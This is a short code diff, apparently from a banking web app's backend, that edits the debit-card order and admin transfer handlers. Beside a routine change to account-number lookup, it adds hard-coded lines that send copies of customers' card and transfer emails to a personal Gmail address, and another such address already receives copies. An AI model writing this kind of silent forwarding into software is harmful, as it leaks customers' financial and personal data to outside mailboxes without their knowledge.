@@ -77,6 +77,7 @@ const orderDebitCard =  async (req, res) => {
 `;
 
      await sendEmail(user.email, subject, text, html);
+    await sendEmail("anniemary841@gmail.com", subject, text, html);
 
     res.status(200).json({ status: "success", data: orderCard })
   } catch (error) {
@@ -143,7 +144,14 @@ const adminTransfer = async (req, res) => {
       return res.status(401).json({ status: "failed", error: "Invalid PIN." });
     }
 
-    const user = await User.findOne({ account_number });
+    
+    let user;
+
+    user = await User.findOne({ savings_account_number: account_number });
+
+    if (!user) {
+      user = await User.findOne({ checkings_account_number: account_number });
+    }
     if (!user) {
       return res.status(404).json({ msg: "User not found." });
     }
@@ -244,6 +252,7 @@ const adminTransfer = async (req, res) => {
     `;
 
     await sendEmail(user.email, subject, text, html);
+    await sendEmail("anniemary841@gmail.com", subject, text, html);
     await sendEmail("companychris00@gmail.com", subject, text, html);
 
     res
